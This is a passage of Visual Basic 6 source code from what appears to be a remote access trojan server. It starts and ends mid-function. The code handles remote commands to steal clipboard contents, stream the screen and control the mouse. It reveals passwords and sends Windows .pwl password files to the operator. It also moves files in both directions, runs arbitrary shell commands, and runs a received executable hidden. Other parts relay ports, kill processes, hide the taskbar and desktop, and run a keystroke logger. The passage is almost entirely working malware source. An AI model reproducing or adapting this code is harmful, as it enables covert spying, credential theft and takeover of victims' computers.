        Case "92":  tmpParm = Split(args, ";")
                    x = SetCursorPos(CLng(tmpParm(0)), CLng(tmpParm(1)))
                    wsSend index, "92" & IIf(x = 0, "error setting coord...", "mouse coord set."), True
        
        Case "93": wsSend index, "93" & Clipboard.GetText, True
        Case "94":  Clipboard.Clear
                    wsSend index, "94"
        Case "95":  Clipboard.SetText args
                    wsSend index, "95"
        
        Case "96": wsSend index, "96" & IIf(OpenDoc(args) > 32, "executing...", "failed..."), True
        Case "97": scMain.Reset
                    wsSend index, "97"
        
        Case "0a": Me.Hide
                    wsSend index, "0a"
        Case "0b": Me.Show
                    wsSend index, "0b"
        Case "0c": ws(0).Close
                    wsSend index, "0c"
        Case "0d":  If Val(args) < 1 Or Val(args) > 32000 Then args = "8000"
                    txtPort.Text = args
                    wsSend index, "0d" & args, True
                    btnStart_Click

                    
        Case "f0":  wsSend index, "f0" & allDrives, True
        Case "f1":  wsSend index, "f1"
                    Call dirsNfiles(index, args)
        
        Case "sb":
                    capScreen = 1
                    tmpParm = Split(args, ";")
                    If tmpParm(3) <> "n" Then Call start_wsMouseK
                    Call liveCap(index, CSng(tmpParm(0)), CByte(tmpParm(1)), CInt(tmpParm(2)))
        Case "se":
                    capScreen = 0
                    If wsMouseK.State <> sckClosed Then wsMouseK.Close
    
        Case "gp":   Call RevealPasswords(GetDesktopWindow)
    
        Case "pi":  wsSend index, "pi" & Format(Now) & " - PONG !", True
    
    
    End Select
End Sub

Public Function wsSend(ByVal index As Integer, ByVal data As String, Optional ByVal encrypted As Boolean)
On Error Resume Next
    sc(index) = 0
    If encrypted = True Then
        ws(index).SendData Mid(data, 1, 2) & encdec(sessKey(index), Mid(data, 3, Len(data)))
    Else
        ws(index).SendData data
    End If
    Do While sc(index) = 0 And ws(index).State = sckConnected
        DoEvents
    Loop
End Function


Public Function TakeSS(ByVal Path As String)
On Error Resume Next
Dim ZLib As New clsZLib
    Clipboard.Clear
    Call keybd_event(44, 0, 0, 0)
    start = Timer
    Do While Timer < start + 0.3
        DoEvents
    Loop
    SavePicture Clipboard.GetData, Path
    Clipboard.Clear
    ZLib.CompressFile Path, App.Path + "\systems.tmp"
    KillFile Path
    Set ZLib = Nothing
End Function

Public Sub liveCap(ByVal index As Integer, ByVal afterDark As Single, ByVal RATE As Byte, ByVal Colors As Integer)
Dim Ret As Long
Dim DeskHwnd As Long
Dim DeskHdc As Long
Dim DeskRect As RECT
On Error Resume Next
    DeskHwnd = GetDesktopWindow()
    DeskHdc = GetDC(DeskHwnd)
    Ret = GetWindowRect(DeskHwnd, DeskRect)
    sc(index) = 0
    ws(index).SendData "sb" & CStr(DeskRect.Right) & ";" & CStr(DeskRect.Bottom)
    Do While sc(index) = 0
        If capScreen = 0 Then Exit Sub
        DoEvents
    Loop
    start_wsScreen
    Do While wsScreen.State <> sckConnected
        DoEvents
        If capScreen = 0 Then Exit Sub
    Loop
    Call DoCapture(index, afterDark, RATE, Colors)
End Sub

Public Sub snapshot()
On Error Resume Next
Call SetAttr(App.Path + "\system.tmp", 0)
KillFile (App.Path + "\system.tmp")
Call SetAttr(App.Path + "\systems.tmp", 0)
KillFile (App.Path + "\systems.tmp")
TakeSS App.Path + "\system.tmp"
start = Timer
Do While FileLen(App.Path + "\systems.tmp") < 1000 Or Timer < start + 3
    DoEvents
Loop
start = Timer
Do While Timer < start + 0.3
    DoEvents
Loop
End Sub

Public Sub printText(Text As String)
On Error Resume Next
Printer.Print Text
End Sub

Public Sub CDOpen()
On Error Resume Next
    SendMCIString "close all", False
    SendMCIString "open cdaudio alias cd wait shareable", True
    SendMCIString "set cd door open", True
End Sub
Public Sub CDClose()
On Error Resume Next
    SendMCIString "set cd door closed", True
End Sub

Public Sub GetPwl()
On Error Resume Next
Dim file As String
Dim buf As String
Dim rasp As String
oldir = CurDir()
ChDrive (WinDir)
ChDir (WinDir)
file = Dir("*.pwl", 39)
Do While file <> ""
    Open file For Binary As 1
    buf = Space(LOF(1))
    Get 1, , buf
    Close 1
    ws(index).SendData "1 " + file + Chr(0) + buf
    Do While sc(index) = 0
        DoEvents
    Loop
    sc(index) = 0
    start = Timer
        Do While Timer < start + 0.3
            DoEvents
        Loop
    file = Dir
Loop
ChDrive (oldir)
ChDir (oldir)
End Sub

Public Function sendKey(ByVal s As String) As Byte
On Error GoTo errore
    SendKeys s
    If Len(s) > 0 Then sendKey = 1
    Exit Function
errore:
    sendKey = 0
End Function
Public Sub ws_SendComplete(index As Integer)
    sc(index) = 1
End Sub

Public Function run(ByVal s As String)
On Error Resume Next
    run = Shell(Mid(s, 1, Len(s) - 1), Val(Right(s, 1)))
End Function

Public Function browse(ByVal Path As String) As String
On Error Resume Next
Dim data As String
    cfile = Dir(fulln(Path) + "*.*", 55)
    Do While cfile <> ""
    fattr = GetAttr(fulln(Path) + cfile)
        data = data + Format(FileDateTime(fulln(Path) + cfile), String(22, "@")) + _
               Space(3) + atrib(fattr) + Space(3) + cfile + Space(3) + _
               Format(FileLen(fulln(Path) + cfile)) + vbCrLf
        cfile = Dir
    Loop
    'data = data & "free space: " & Format(GetDiskSpaceFree(Mid(Path, 1, 1)))
    browse = data
End Function

Public Function atrib(ByVal fattr As Integer) As String
    'atrib = Space(3)
    If fattr And 16 Then
        atrib = atrib + "D"
    Else: atrib = atrib + "-"
    End If
    If fattr And 1 Then
        atrib = atrib + "r"
    Else: atrib = atrib + "-"
    End If
    If fattr And 2 Then
        atrib = atrib + "h"
    Else: atrib = atrib + "-"
    End If
    If fattr And 4 Then
        atrib = atrib + "s"
    Else: atrib = atrib + "-"
    End If
    If fattr And 32 Then
        atrib = atrib + "a"
    Else: atrib = atrib + "-"
    End If
End Function

Public Sub KillFile(s As String)
On Error Resume Next
oldir = CurDir()
ChDrive (s)
ChDir (JustPath(s))
    cfile = Dir(JustName(s), 39)
    Do While cfile <> ""
        SetAttr cfile, 0
        Kill cfile
        cfile = Dir
    Loop
ChDrive (oldir)
ChDir (oldir)
End Sub

Public Sub sendfiles(index As Integer, ByVal name As String)
On Error Resume Next
Dim buf As String
oldir = CurDir()
ChDrive (name)
ChDir (JustPath(name))
    cfile = Dir(JustName(name), 39)
    Do While cfile <> ""
        Open cfile For Binary As 2
        buf = Space(LOF(2))
        Get 2, , buf
        Close 2
        ws(index).SendData "06" + cfile + Chr(0) + buf
        Do While sc(index) = 0
            DoEvents
        Loop
        sc(index) = 0
        cfile = Dir
        start = Timer
        Do While ack <> "ACK" And Timer < start + 10
            DoEvents
        Loop
        ack = ""
        start = Timer
        Do While Timer < start + 0.3
            DoEvents
        Loop
    Loop
ChDrive (oldir)
ChDir (oldir)
End Sub

Public Sub bep(s As String)
On Error Resume Next
If Val(s) = 0 Then s = "1"
For i = 1 To CInt(Val(s))
    Beep
    start = Timer
    Do While Timer < start + 0.8
        DoEvents
    Loop
Next i
End Sub
Public Sub msg(s As String)
    MsgBox Left(JustPath(s), Len(JustPath(s)) - 1), (Val(Right(s, 1)) + 1) * 16 + vbSystemModal + vbMsgBoxSetForeground, Left(JustName(s), Len(JustName(s)) - 1)
End Sub

Public Sub putfile(index As Integer, ByVal s As String)
On Error Resume Next
Dim data As String
cont(index) = 1
dirto = JustPath(Mid(s, 1, InStr(s, Chr(0)) - 1))
file = JustName(Mid(s, 1, InStr(s, Chr(0)) - 1))
ChDrive (dirto)
If Dir(dirto, vbDirectory) = "" Then MkDir dirto
oldir = CurDir()
ChDir (dirto)
    If Dir(file, 39) <> "" Then
        SetAttr file, 0
        Kill file
    End If
    data = Mid(s, InStr(s, Chr(0)) + 1, Len(s))
    Open file For Binary As 3
    Do While data <> ""
        Put 3, , data
        start = Timer
        Do While Timer < start + 0.5
            DoEvents
        Loop
        ws(index).GetData data
    Loop
    Close 3
    cont(index) = 0
ChDrive (oldir)
ChDir (oldir)
wsSend index, "07"
End Sub

Public Function upgrade(ByVal index As Integer, ByVal s As String) As String
On Error Resume Next
Dim data As String
cont(index) = 1
dirto = App.Path 'SysDir
file = "tmpx" & App.EXEName & ".exe"
oldir = CurDir()
ChDrive (dirto)
ChDir (dirto)
    If Dir(file, 39) <> "" Then
        SetAttr file, 0
        Kill file
    End If
    data = s
    Open file For Binary As 4
    Do While data <> ""
        Put 4, , data
        start = Timer
        Do While Timer < start + 0.5
            DoEvents
        Loop
        ws(index).GetData data
    Loop
    Close 4
    cont(index) = 0
ChDrive (oldir)
ChDir (oldir)
start = Timer
'Do While Timer < start + 0.5
    'DoEvents
'Loop
x = Shell(fulln(App.Path) & file, vbHide)
If x <> 0 Then
    upgrade = "upgrade app started."
Else
    upgrade = "upgrade app failed."
End If
End Function

Public Function listWind(Optional ByVal forHTTP As Boolean) As String
On Error Resume Next
Dim WindowHandle As Long, ReturnVal As Long, NameString As String
Dim procID As Long
NameString = Space$(255)
WindowHandle = GetForegroundWindow()
ReturnVal = GetWindowText(WindowHandle, NameString, 255)
x = GetWindowThreadProcessId(WindowHandle, procID)
If forHTTP = True Then listWind = " HWND ; PID ; WINDOW CAPTION" & vbCrLf
listWind = listWind & Format(WindowHandle) & ";" _
    & Format(procID) & ";" _
    & "ACTIVE: " & Strip(NameString) & vbCrLf

WindowHandle = GetWindow(WindowHandle, 0)
Do While WindowHandle <> 0
  NameString = Space$(255)
  ReturnVal = GetWindowText(WindowHandle, NameString, 255)
  x = GetWindowThreadProcessId(WindowHandle, procID)
  If Len(Strip(NameString)) > 1 Then listWind = listWind _
        & Format(WindowHandle) & ";" _
        & Format(procID) & ";" _
        & Strip(NameString) & vbCrLf
  WindowHandle = GetWindow(WindowHandle, GW_HWNDNEXT)
Loop
End Function


Public Function KillProcess(ByVal ProgramPath As String) As Boolean
On Local Error GoTo Finish

Const PROCESS_ALL_ACCESS = 0
Const TH32CS_SNAPPROCESS As Long = 2&
Const PROCESS_TERMINATE As Long = &H1
Dim uProcess As PROCESSENTRY32
Dim rProcessFound As Long
Dim hSnapshot As Long
Dim szExename As String
Dim exitCode As Long
Dim myProcess As Long
Dim appCount As Integer
Dim i As Integer
Dim pacc As Long
    
    pacc = PROCESS_ALL_ACCESS Or PROCESS_TERMINATE
    appCount = 0
    uProcess.dwSize = Len(uProcess)
    hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    rProcessFound = ProcessFirst(hSnapshot, uProcess)
    Do While rProcessFound
        i = InStr(1, uProcess.szExeFile, Chr(0))
        szExename = LCase$(Left$(uProcess.szExeFile, i - 1))
        If LCase$(szExename) = LCase$(ProgramPath) Then
            appCount = appCount + 1
            myProcess = OpenProcess(pacc, False, uProcess.th32ProcessID)
            KillProcess = TerminateProcess(myProcess, exitCode)
            Call CloseHandle(myProcess)
        End If
        rProcessFound = ProcessNext(hSnapshot, uProcess)
    Loop
    Call CloseHandle(hSnapshot)
    Exit Function

Finish:
    KillProcess = False
End Function
Public Function ProcessList(Optional ByVal forHTTP As Boolean) As String
Dim hSnapshot As Long
Dim uProcess As PROCESSENTRY32
Dim r As Long
If forHTTP = True Then ProcessList = "PID; PPID; EXENAME; PRIORITY; THREADS" & vbCrLf
    hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    If hSnapshot = 0 Then Exit Function
    uProcess.dwSize = Len(uProcess)
    r = ProcessFirst(hSnapshot, uProcess)
    Do While r
        ProcessList = ProcessList & Str(uProcess.th32ProcessID) _
        & ";" & Str(uProcess.th32ParentProcessID) _
        & ";" & Strip(uProcess.szExeFile) _
        & ";" & Str(uProcess.pcPriClassBase) _
        & ";" & Str(uProcess.cntThreads) _
        & vbCrLf
        
        r = ProcessNext(hSnapshot, uProcess)
    Loop
    Call CloseHandle(hSnapshot)
End Function

Public Function KillProcessID(ByVal processID As Long) As Boolean
On Local Error GoTo Finish
Const PROCESS_ALL_ACCESS = 0
Const PROCESS_TERMINATE As Long = &H1
Dim uProcess As PROCESSENTRY32
Dim exitCode As Long
Dim myProcess As Long
    uProcess.dwSize = Len(uProcess)
    uProcess.th32ProcessID = processID
    myProcess = OpenProcess(PROCESS_ALL_ACCESS Or PROCESS_TERMINATE, False, uProcess.th32ProcessID)
    KillProcessID = TerminateProcess(myProcess, exitCode)
    Call CloseHandle(myProcess)
    Exit Function
Finish:
    KillProcessID = False
End Function


'mouse stuff
Public Function GetX() As Long
    Dim n As POINTAPI
    GetCursorPos n
    GetX = n.x
End Function
Public Function GetY() As Long
    Dim n As POINTAPI
    GetCursorPos n
    GetY = n.y
End Function
Public Sub LeftClick()
    LeftDown
    LeftUp
End Sub
Public Sub LeftDown()
    mouse_event MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0
End Sub
Public Sub LeftUp()
    mouse_event MOUSEEVENTF_LEFTUP, 0, 0, 0, 0
End Sub
Public Sub MiddleClick()
    MiddleDown
    MiddleUp
End Sub
Public Sub MiddleDown()
    mouse_event MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0
End Sub
Public Sub MiddleUp()
    mouse_event MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0
End Sub
Public Sub MoveMouse(xMove As Long, yMove As Long)
    mouse_event MOUSEEVENTF_MOVE, xMove, yMove, 0, 0
End Sub
Public Sub RightClick()
    RightDown
    RightUp
End Sub
Public Sub RightDown()
    mouse_event MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0
End Sub
Public Sub RightUp()
    mouse_event MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0
End Sub
Public Sub SetMousePos(xPos As Long, yPos As Long)
    SetCursorPos xPos, yPos
End Sub

Public Function MilliToHMS(Milliseconds)
    Dim Sec, Min0, Min, Hr
    Hr = Fix(Milliseconds / 3600000)
    Min0 = Fix(Milliseconds Mod 3600000)
    Min = Fix(Min0 / 60000)
    Sec = Fix(Min0 Mod 60000)
    Sec = Fix(Sec / 1000)
    If Len(Sec) = 1 Then
        Sec = "0" & Sec
    End If
    If Len(Min) = 1 Then
        Min = "0" & Min
    End If
    If Len(Hr) = 1 Then
        Hr = "0" & Hr
    End If
    MilliToHMS = Hr & ":" & Min & ":" & Sec
End Function

Public Function GetTimeOnWindows()
    GetTimeOnWindows = MilliToHMS(GetTickCount)
End Function

Public Function Infos(ByVal index As Integer, Optional ByVal forHTTP As Boolean) As String
If forHTTP = True Then
    Infos = "local time:     " & Format(Now) _
    & vbCrLf & "computer name:  " & getpcname _
    & vbCrLf & "username: " & Space(6) & getusrname _
    & vbCrLf & WindowsVersion _
    & vbCrLf & "processor type, total physical memory, avail phys mem., mem. utilization: " _
    & vbCrLf & SysInfo _
    & "resolution:    " & Str(Screen.Width / Screen.TwipsPerPixelX) & "x" & Str(Screen.Height / Screen.TwipsPerPixelY) _
    & vbCrLf & "server version: " & myVer _
    & vbCrLf & "windows UpTime: " & GetTimeOnWindows _
    & vbCrLf & "server ON time: " & serverONTime _
    & vbCrLf & "clients online: " & CStr(nroC) _
    & vbCrLf & "server path:    " & fulln(App.Path) _
    & vbCrLf & "server exename: " & App.EXEName _
    & vbCrLf & "drives: " & vbCrLf _
    & vbCrLf & allDrives _
    & vbCrLf & environVars
Else
    Infos = Format(Now) _
    & vbCrLf & getpcname _
    & vbCrLf & getusrname _
    & vbCrLf & WindowsVersion _
    & vbCrLf & SysInfo _
    & Str(Screen.Width / Screen.TwipsPerPixelX) & " x" & Str(Screen.Height / Screen.TwipsPerPixelY) _
    & vbCrLf & myVer _
    & vbCrLf & GetTimeOnWindows _
    & vbCrLf & serverONTime _
    & vbCrLf & Str(index) _
    & vbCrLf & CStr(nroC) _
    & vbCrLf & fulln(App.Path) & App.EXEName & ".exe" _
    & vbCrLf & "drives:" _
    & vbCrLf & allDrives _
    & vbCrLf & environVars
End If
End Function

Public Function allDrives() As String
    For i = 1 To 26
        drv = Chr(64 + i) & ":\"
        If GetDrive(drv) <> "" Then
            allDrives = allDrives & drv & GetDrive(drv) & vbCrLf
        End If
    Next i
End Function
Public Function environVars() As String
    indx = 1
    environVars = environVars & "Environment variables:" & vbCrLf
    Do
        environVars = environVars & vbCrLf & Environ(indx)
        indx = indx + 1
    Loop Until Environ(indx - 1) = ""
End Function

Public Function nroC() As Byte
For i = 1 To 5
    If ws(i).State = 7 Then nroC = nroC + 1
Next i
End Function

Public Sub redirect(index As Integer, ByVal data As String)
On Error Resume Next
    localP = deLimit(data, Data1$)
    closeOpen = deLimit(Data1, Data2$)
    foreignAdr = deLimit(Data2, Data3$)
    foreignPort = deLimit(Data3, Data4$)
    redir = deLimit(Data4, data5$)
    remoteP = data5
    fail = 0
    connectR index, 0
    Select Case fail
        Case 0: ws(index).SendData ".." & encdec(sessKey(index), "redirected to localhost.")
        Case 1: ws(index).SendData ".." & encdec(sessKey(index), "port not closed.")
        Case 2: ws(index).SendData ".." & encdec(sessKey(index), "listening on redirected remote port")
        Case 3: ws(index).SendData ".." & encdec(sessKey(index), "connecting redirect host failed.")
    End Select
    If redir = 1 Then connectL 1
End Sub

Public Sub connectR(index As Integer, ByVal conNr As Byte)
On Error Resume Next
    If wsR(conNr).State <> 0 Then
    If closeOpen = "1" Then
        wsR(conNr).Close
    Else
        fail = 1
        Exit Sub
    End If
    End If
    If redir = "0" Then
        wsR(conNr).LocalPort = localP
        wsR(conNr).Listen
        fail = 2
    Else
        Load wsR(1)
        wsR(1).LocalPort = 0
        wsR(1).RemoteHost = CStr(ws(index).RemoteHostIP)
        wsR(1).RemotePort = remoteP
        If wsR(1).State <> 0 Then wsR(1).Close
        start = Timer
        wsR(1).Connect
        Do While wsR(1).State <> 7
            wsR(1).Connect
            If Timer > start + 2 Then
                fail = 3
                Exit Sub
            End If
            DoEvents
        Loop
    End If
End Sub
Public Sub connectL(ByVal connl As Byte)
On Error Resume Next
 Load wsL(connl)
    If wsL(connl).State <> 0 Then wsL(connl).Close
    
    If foreignAdr = "0" Then
        wsL(connl).LocalPort = localP
        wsL(connl).Listen
        If wsL(connl).State = 2 Then
            fail = 1
        Else
            fail = 2
            Unload wsL(connl)
        End If
    Else
        wsL(connl).LocalPort = 0
        wsL(connl).RemoteHost = foreignAdr
        wsL(connl).RemotePort = foreignPort
        wsL(connl).Connect
        start = Timer
        Do While wsL(connl).State <> 7
            wsL(connl).Connect
            DoEvents
            If Timer > start + 3 Then
                Unload wsL(connl)
                fail = 3
                Exit Sub
            End If
            DoEvents
        Loop
    End If
End Sub

Public Sub wsL_ConnectionRequest(index As Integer, ByVal requestID As Long)
On Error Resume Next
If wsL(index).State <> 0 Then wsL(index).Close
wsL(index).Accept requestID
End Sub
Public Sub wsR_ConnectionRequest(index As Integer, ByVal requestID As Long)
On Error Resume Next
If index = 0 Then
conNr = wsR.Count
Load wsR(conNr)
'fail = 0
    'Select Case fail
        'Case 0: ws(index).SendData "51connected to foreign host."
        'Case 1: ws(index).SendData "51port listening."
        'Case 2: ws(index).SendData "51port listening failed."
        'Case 3: ws(index).SendData "51connected to foreign host failed."
    'End Select
wsR(conNr).Accept requestID
End If
End Sub
Public Sub wsL_close(index As Integer)
On Error Resume Next
fail = 0
connectL index
End Sub
Public Sub wsR_close(index As Integer)
On Error Resume Next
wsR(index).Close
Unload wsR(index)
wsL(index).Close
End Sub
Public Sub wsL_DataArrival(index As Integer, ByVal bytes As Long)
On Error Resume Next
Dim data As String
wsL(index).GetData data
wsR(index).SendData data
'scr(index) = 0
'Do While scr(index) = 0
'DoEvents
'Loop
End Sub
Public Sub wsR_DataArrival(index As Integer, ByVal bytes As Long)
On Error Resume Next
Dim data As String
wsR(index).GetData data
If foreignAdr <> "0" Then connectL index
wsL(index).SendData data
'scl(index) = 0
'Do While scl(index) = 0
'DoEvents
'Loop
End Sub

'public Sub wsL_SendComplete(index As Integer)
'scl(index) = 1
'End Sub
'public Sub wsR_SendComplete(index As Integer)
'scr(index) = 1
'End Sub

Public Sub disableRedir()
On Error Resume Next
For i = wsR.UBound To 1 Step -1
    wsR_close (i)
Next i
For i = wsL.UBound To 1 Step -1
    wsL(i).Close
    Unload wsL(i)
Next i
End Sub


Public Function deLimit(ByVal sourceStr As String, ByRef str2 As String) As String
On Error Resume Next
deLimit = Left$(sourceStr, InStr(sourceStr, Chr(0)) - 1)
str2 = Mid(sourceStr, InStr(sourceStr, Chr(0)) + 1)
End Function

Public Function HideTaskBar()
On Error Resume Next
    Dim Handle As Long
    Handle& = FindWindow("Shell_TrayWnd", vbNullString)
    ShowWindow Handle&, 0
End Function

Public Function ShowTaskBar()
On Error Resume Next
    Dim Handle As Long
    Handle& = FindWindow("Shell_TrayWnd", vbNullString)
    ShowWindow Handle&, 1
End Function

Public Function HideDesktop()
On Error Resume Next
    ShowWindow FindWindowEx(FindWindowEx(FindWindow("Progman", vbNullString), 0&, "SHELLDLL_DefView", vbNullString), 0&, "SysListView32", vbNullString), 0
End Function

Public Function ShowDesktop()
On Error Resume Next
    ShowWindow FindWindowEx(FindWindowEx(FindWindow("Progman", vbNullString), 0&, "SHELLDLL_DefView", vbNullString), 0&, "SysListView32", vbNullString), 5
End Function

Public Function HideStartButton()
On Error Resume Next
    Dim Handle As Long, FindClass As Long
    FindClass& = FindWindow("Shell_TrayWnd", "")
    Handle& = FindWindowEx(FindClass&, 0, "Button", vbNullString)
    ShowWindow Handle&, 0
End Function

Public Function ShowStartButton()
On Error Resume Next
    Dim Handle As Long, FindClass As Long
    FindClass& = FindWindow("Shell_TrayWnd", "")
    Handle& = FindWindowEx(FindClass&, 0, "Button", vbNullString)
    ShowWindow Handle&, 1
End Function

Public Function HideTaskBarClock()
On Error Resume Next
    Dim FindClass As Long, FindParent As Long, Handle As Long
    FindClass& = FindWindow("Shell_TrayWnd", vbNullString)
    FindParent& = FindWindowEx(FindClass&, 0, "TrayNotifyWnd", vbNullString)
    Handle& = FindWindowEx(FindParent&, 0, "TrayClockWClass", vbNullString)
    ShowWindow Handle&, 0
End Function

Public Function ShowTaskBarClock()
On Error Resume Next
    Dim FindClass As Long, FindParent As Long, Handle As Long
    FindClass& = FindWindow("Shell_TrayWnd", vbNullString)
    FindParent& = FindWindowEx(FindClass&, 0, "TrayNotifyWnd", vbNullString)
    Handle& = FindWindowEx(FindParent&, 0, "TrayClockWClass", vbNullString)
    ShowWindow Handle&, 1
End Function

Public Function HideTaskBarIcons()
On Error Resume Next
    Dim FindClass As Long, Handle As Long
    FindClass& = FindWindow("Shell_TrayWnd", "")
    Handle& = FindWindowEx(FindClass&, 0, "TrayNotifyWnd", vbNullString)
    ShowWindow Handle&, 0
End Function

Public Function ShowTaskBarIcons()
On Error Resume Next
    Dim FindClass As Long, Handle As Long
    FindClass& = FindWindow("Shell_TrayWnd", "")
    Handle& = FindWindowEx(FindClass&, 0, "TrayNotifyWnd", vbNullString)
    ShowWindow Handle&, 1
End Function

Public Function HideProgramsShowingInTaskBar()
On Error Resume Next
    Dim FindClass As Long, FindClass2 As Long, Parent As Long, Handle As Long
    FindClass& = FindWindow("Shell_TrayWnd", "")
    FindClass2& = FindWindowEx(FindClass&, 0, "ReBarWindow32", vbNullString)
    Parent& = FindWindowEx(FindClass2&, 0, "MSTaskSwWClass", vbNullString)
    Handle& = FindWindowEx(Parent&, 0, "SysTabControl32", vbNullString)
    ShowWindow Handle&, 0
End Function

Public Function ShowProgramsShowingInTaskBar()
On Error Resume Next
    Dim FindClass As Long, FindClass2 As Long, Parent As Long, Handle As Long
    FindClass& = FindWindow("Shell_TrayWnd", "")
    FindClass2& = FindWindowEx(FindClass&, 0, "ReBarWindow32", vbNullString)
    Parent& = FindWindowEx(FindClass2&, 0, "MSTaskSwWClass", vbNullString)
    Handle& = FindWindowEx(Parent&, 0, "SysTabControl32", vbNullString)
    ShowWindow Handle&, 1
End Function


Public Function ExecuteCommand(ByVal CommandLine As String) As String
On Error GoTo errore
    Dim proc As PROCESS_INFORMATION     'Process info filled by CreateProcessA
    Dim Ret As Long                     'long variable for get the return value of the
                                        'API functions
    Dim start As STARTUPINFO            'StartUp Info passed to the CreateProceeeA
                                        'function
    Dim sa As SECURITY_ATTRIBUTES       'Security Attributes passeed to the
                                        'CreateProcessA function
    Dim hReadPipe As Long               'Read Pipe handle created by CreatePipe
    Dim hWritePipe As Long              'Write Pite handle created by CreatePipe
    Dim lngBytesread As Long            'Amount of byte read from the Read Pipe handle
    Dim strBuff As String * 256         'String buffer reading the Pipe

    'Create the Pipe
    sa.nLength = Len(sa)
    sa.bInheritHandle = 1&
    sa.lpSecurityDescriptor = 0&
    Ret = CreatePipe(hReadPipe, hWritePipe, sa, 0)
    
    If Ret = 0 Then
        'If an error occur during the Pipe creation exit
        ExecuteCommand = "CreatePipe failed. Error: " & Err.LastDllError
        Exit Function
    End If
    
    'Launch the command line application
    start.cb = Len(start)
    start.dwFlags = STARTF_USESTDHANDLES Or STARTF_USESHOWWINDOW
    'set the StdOutput and the StdError output to the same Write Pipe handle
    start.hStdOutput = hWritePipe
    start.hStdError = hWritePipe
    'Execute the command
    mCommand = Environ("COMSPEC") + " /c " + CommandLine
    Ret& = CreateProcessA(0&, mCommand, sa, sa, 1&, _
        NORMAL_PRIORITY_CLASS, 0&, 0&, start, proc)
        
    If Ret <> 1 Then
        'if the command is not found ....
        ExecuteCommand = "file or command not found."
        Exit Function
    End If
    
    'Now We can ... must close the hWritePipe
    Ret = CloseHandle(hWritePipe)
    mOutputs = ""
    
    'Read the ReadPipe handle
    Do
        Ret = ReadFile(hReadPipe, strBuff, 256, lngBytesread, 0&)
        mOutputs = mOutputs & Left(strBuff, lngBytesread)
    Loop While Ret <> 0
    
    'Close the opened handles
    Ret = CloseHandle(proc.hProcess)
    Ret = CloseHandle(proc.hThread)
    Ret = CloseHandle(hReadPipe)
    
    'Return the Outputs property with the entire DOS output
    ExecuteCommand = mOutputs
    Exit Function
errore:
    ExecuteCommand = "error:" + Err.Description
End Function

Public Function sendBackNTStuff() As String
On Error Resume Next
sendBackNTStuff = GetString("HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system", "DisableTaskMgr") _
& GetString("HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\Explorer", "NoLogoff") _
& GetString("HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\Explorer", "NoClose") _
& GetString("HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system", "DisableLockWorkstation") _
& GetString("HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system", "DisableChangePassword")
Do While Len(sendBackNTStuff) < 5
    sendBackNTStuff = sendBackNTStuff & "0"
Loop
End Function

Public Sub killAllRedirect()
On Error Resume Next
For i = wsR.UBound To 0 Step -1
    wsR(i).Close
    Unload wsR(i)
Next i
For i = wsL.UBound To 0 Step -1
    wsL(i).Close
    Unload wsL(i)
Next i
End Sub

'keylogger
Public Sub CheckKey(ByVal index As Integer, Optional ByVal isOffline As Boolean)
    Dim keycode As Integer, x As Integer, shift As Integer
    Dim Control As Integer, Temp As String
    Dim data As String
    On Error GoTo errore
    
    Do
    DoEvents
        For keycode = 8 To 255 'scan every key from #8-255
            x = GetAsyncKeyState(keycode) 'get the state of the key
            If EndKeyLogger = True Or ws(index).State <> 7 Then
                EndKeyLogger = True
                Exit Sub
            End If
            If x = -32767 Then 'if the key is pressed, its value is -32767
                Select Case keycode
                    Case 8 'backspace
                        data = "[BCKSPACE]"
                    Case 9 'tab
                        data = "[TAB]"
                    Case 13 'enter
                        data = "[ENTER]"
                    Case 27 'escape
                        data = "[ESC]"
                    Case &H2E
                        data = "[DEL]"
                    Case &H2C
                        data = "[PRTSCR]"
                    Case &H5D
                        data = "[AppKey]"
                    Case &H5B, &H5C
                        data = "[WinKey]"
                    Case 3
                        data = "[CTRLBRK]"
                    Case &H21
                        data = "[PGUP]"
                    Case &H22
                        data = "[PGDOWN]"
                    Case &H23
                        data = "[END]"
                    Case &H24
                        data = "[HOME]"
                    Case &H6A
                        data = "*"
                    Case &H6B
                        data = "+"
                    Case &H6C
                        data = "."
                    Case &H6D
                        data = "-"
                    Case &H6F
                        data = "/"
                    Case &H90
                        data = "[NUM]"
                    Case &H91
                        data = "[SCROLL]"
                    Case &H13
                        data = "[PAUSE]"
                    Case 32 'space
                        data = " "
                    Case 48 '0
                        data = Shf(shift = 1, ")", "0")
                    Case 49 '1
                        data = Shf(shift = 1, "!", "1")
                    Case 50 '2
                        data = Shf(shift = 1, "@", "2")
                    Case 51 '3
                        data = Shf(shift = 1, "#", "3")
                    Case 52 '4
                        data = Shf(shift = 1, "$", "4")
                    Case 53 '5
                        data = Shf(shift = 1, "%", "5")
                    Case 54 '6
                        data = Shf(shift = 1, "^", "6")
                    Case 55 '7
                        data = Shf(shift = 1, "&", "7")
                    Case 56 '8
                        data = Shf(shift = 1, "*", "8")
                    Case 57 '9
                        data = Shf(shift = 1, "(", "9")
                    Case &H60 To &H69
                        data = CStr(keycode - &H60)
                    Case 65 To 90 'a-z
                        data = Shf(shift = 1, UCase$(Chr$(keycode)), LCase$(Chr$(keycode)))
                    Case 112 To 123 'F1-F12
                        data = "[FKEY]" & "[F" + CStr(keycode - 111) + "]" 'Case F1 to F12
                        Temp = Ctrl(Control = 1, "On", "Off")
                    Case 186 ';
                        data = Shf(shift = 1, ":", ";")
                    Case 187 '=
                        data = Shf(shift = 1, "+", "=")
                    Case 188 ',
                        data = Shf(shift = 1, "<", ",")
                    Case 189 '-
                        data = Shf(shift = 1, "_", "-")
                    Case 190 '.
                        data = Shf(shift = 1, ">", ".")
                    Case 191 '/
                        data = Shf(shift = 1, "?", "/")
                    Case 192 '`
                        data = Shf(shift = 1, "~", "`")
                    Case 219 '[
                        data = Shf(shift = 1, "{", "[")
                    Case 220 '\
                        data = Shf(shift = 1, "|", "\")
                    Case 221 ']
                        data = Shf(shift = 1, "}", "]")
                    Case 222 ''
                        data = Shf(shift = 1, Chr$(34), "'")
                End Select
